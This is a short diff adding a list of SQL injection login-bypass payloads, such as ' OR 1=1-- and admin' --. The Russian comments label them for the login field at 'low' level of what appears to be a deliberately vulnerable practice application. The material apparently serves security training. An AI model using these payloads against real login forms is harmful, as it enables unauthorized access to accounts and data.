@@ -1,0 +1,7 @@
+# SQL Injection — поле Login (уровень low)
+# Раздел меню: SQL Injection → SQLi (Login) / Login Forms
+
+' OR 1=1--
+' OR '1'='1
+admin' --
+' OR 1=1#
